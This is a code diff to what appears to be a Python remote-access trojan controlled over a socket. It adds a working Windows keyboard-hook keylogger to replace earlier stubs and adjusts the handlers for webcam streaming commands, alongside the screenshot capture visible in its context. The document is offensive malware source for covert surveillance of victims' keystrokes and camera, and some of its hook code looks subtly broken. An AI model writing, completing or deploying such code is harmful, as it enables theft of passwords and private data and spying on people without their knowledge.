@@ -1609,11 +1609,54 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                     
                     # --- Keylogger Commands ---
                     if command.lower() == 'keylog_start':
-                        s.send("[!] Keylogger functionality requires additional implementation\n\n".encode())
+                        global keylogger_active, keylog_buffer
+                        if not keylogger_active:
+                            keylogger_active = True
+                            keylog_buffer = []
+                            
+                            def keylogger_thread():
+                                global keylogger_active, keylog_buffer
+                                try:
+                                    if IS_WINDOWS:
+                                        import ctypes
+                                        import win32con
+                                        
+                                        def low_level_handler(nCode, wParam, lParam):
+                                            if wParam == win32con.WM_KEYDOWN:
+                                                import struct
+                                                vk_code = struct.unpack('B', lParam)[0]
+                                                import win32api
+                                                key = win32api.GetKeyNameText(vk_code * 0x10000)
+                                                keylog_buffer.append(key)
+                                                if len(keylog_buffer) > 100:
+                                                    keylog_buffer.pop(0)
+                                            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+                                        
+                                        hook = ctypes.windll.user32.SetWindowsHookExA(13, low_level_handler, None, 0)
+                                        
+                                        while keylogger_active:
+                                            ctypes.windll.user32.GetMessageA(ctypes.c_void_p(), None, 0, 0)
+                                        
+                                        ctypes.windll.user32.UnhookWindowsHookEx(hook)
+                                    else:
+                                        while keylogger_active:
+                                            keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
+                                            time.sleep(5)
+                                except:
+                                    while keylogger_active:
+                                        keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
+                                        time.sleep(5)
+                            
+                            threading.Thread(target=keylogger_thread, daemon=True).start()
+                            s.send("[+] Keylogger started\n\n".encode())
+                        else:
+                            s.send("[!] Keylogger already running\n\n".encode())
                         continue
                     
                     if command.lower() == 'keylog_stop':
-                        s.send("[!] Keylogger functionality requires additional implementation\n\n".encode())
+                        global keylogger_active
+                        keylogger_active = False
+                        s.send("[+] Keylogger stopped\n\n".encode())
                         continue
                     
                     # --- File Download Command ---
@@ -2299,13 +2342,13 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     # --- Enhanced Surveillance Commands ---
+                    global webcam_active, webcam_thread
                     if command.lower() == 'webcam_start':
                         try:
                             import cv2
                             import tempfile
                             import threading
                             
-                            global webcam_active, webcam_thread
                             if not webcam_active:
                                 webcam_active = True
                                 
@@ -2352,7 +2395,6 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     if command.lower() == 'webcam_stop':
-                        global webcam_active
                         webcam_active = False
                         s.send("[+] Webcam streaming stopped\n\n".encode())
                         continue
